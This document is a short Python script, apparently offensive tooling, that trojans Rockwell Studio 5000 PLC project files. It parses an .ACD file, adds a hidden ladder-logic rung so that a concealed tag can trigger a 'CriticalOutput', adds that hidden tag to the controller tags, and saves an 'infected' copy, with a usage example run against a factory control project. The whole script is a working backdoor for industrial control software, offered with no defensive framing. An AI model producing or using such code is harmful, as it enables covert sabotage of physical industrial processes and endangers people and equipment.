# acd_project_infector.py - Trojan Rockwell Studio 5000 projects
import struct
import xml.etree.ElementTree as ET

class ACDProjectInfector:
    def __init__(self, acd_file):
        self.acd_file = acd_file

    def parse_acd_structure(self):
        """
        .ACD file format (proprietary binary + XML)
        Structure:
        - Header (magic bytes, version)
        - Project metadata (XML)
        - Ladder logic (binary encoded)
        - Tags database
        """
        with open(self.acd_file, 'rb') as f:
            data = f.read()

        # Find XML section (starts with <?xml)
        xml_start = data.find(b'<?xml')
        xml_end = data.find(b'</RSLogix5000Content>') + len(b'</RSLogix5000Content>')

        self.header = data[:xml_start]
        self.xml_data = data[xml_start:xml_end]
        self.ladder_data = data[xml_end:]

    def inject_malicious_rung(self):
        """
        Inject hidden ladder logic rung
        Rung: IF hidden_tag = 1 THEN [malicious action]
        """
        # Parse project XML
        root = ET.fromstring(self.xml_data)

        # Locate MainRoutine
        for routine in root.findall(".//Routine[@Name='MainRoutine']"):
            # Add hidden rung
            malicious_rung = ET.Element("Rung", Number="999", Type="N")
            malicious_rung.text = """
            <![CDATA[
            XIC(HiddenTag)OTE(CriticalOutput)AFI();
            ]]>
            """
            routine.append(malicious_rung)

        # Add hidden tag to controller tags
        tags = root.find(".//Tags")
        hidden_tag = ET.Element("Tag", Name="HiddenTag", DataType="BOOL")
        tags.append(hidden_tag)

        self.xml_data = ET.tostring(root, encoding='utf-8')

    def rebuild_acd(self, output_file):
        """
        Rebuild infected .ACD file
        """
        with open(output_file, 'wb') as f:
            f.write(self.header)
            f.write(self.xml_data)
            f.write(self.ladder_data)

        print(f"[+] Infected ACD saved: {output_file}")

# Usage
infector = ACDProjectInfector("FactoryControl.ACD")
infector.parse_acd_structure()
infector.inject_malicious_rung()
infector.rebuild_acd("FactoryControl_Infected.ACD")
